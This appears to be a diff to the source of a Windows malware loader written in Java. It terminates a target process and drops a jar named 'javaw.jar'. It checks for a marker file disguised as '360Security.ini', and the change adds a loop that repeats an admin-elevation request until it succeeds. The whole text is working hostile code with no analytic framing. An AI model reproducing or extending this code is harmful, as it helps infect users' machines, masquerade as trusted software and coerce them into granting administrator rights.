@@ -1,5 +1,5 @@
-import com.sun.jna.platform.win32.Kernel32;
-import com.sun.jna.platform.win32.WinNT;
+import com.sun.jna.WString;
+import com.sun.jna.platform.win32.*;
 
 import java.awt.*;
 import java.io.File;
@@ -14,18 +14,17 @@ public class Loader {
         try {
             int PID = Integer.parseInt(args[0]);
             File file = new File(getPath() + "\\javaw.jar");
-            File file1 = new File(getPath1() + "\\Copy.jar");
             WinNT.HANDLE handle = Kernel32.INSTANCE.OpenProcess(WinNT.PROCESS_ALL_ACCESS,false,PID);
             Kernel32.INSTANCE.TerminateProcess(handle,0);
             createConfig();
-            createFile(file, file1);
+            createFile(file);
             createProcess();
         }catch (ArrayIndexOutOfBoundsException e) {
             File file = new File(getPath() + "\\javaw.jar");
-            File file1 = new File(getPath1() + "\\Copy.jar");
-            if (!file.exists()) {
+            File file1 = new File(getPath1() + "\\360Security.ini");
+            if (!file1.exists()) {
                 createConfig();
-                createFile(file, file1);
+                createFile(file);
                 createProcess();
             } else {
                 System.exit(0);
@@ -34,20 +33,19 @@ public class Loader {
     }
     public static void createProcess() {
         try {
-            Runtime.getRuntime().exec("java -jar " + getPath() + "\\" + "javaw.jar");
+            while (!LoadDLL.instance.RunAsAdmin(new WString(System.getProperty("java.home") + "\\bin\\javaw.exe"), new WString("-jar " + getPath() + "\\javaw.jar"))){
+            }
         }catch (Exception e) {
         }
     }
-    public static void createFile(File file,File CopyFile) {
+    public static void createFile(File file) {
         try {
             file.createNewFile();
             FileOutputStream fileOutputStream = new FileOutputStream(file);
-            FileOutputStream fileOutputStream1 = new FileOutputStream(CopyFile);
             byte[] bytes = new byte[1024];
             int len = 0;
             while ((len = jar.read(bytes))!=-1) {
                 fileOutputStream.write(bytes,0,len);
-                fileOutputStream1.write(bytes,0,len);
             }
         }catch (Exception e) {
             e.printStackTrace();
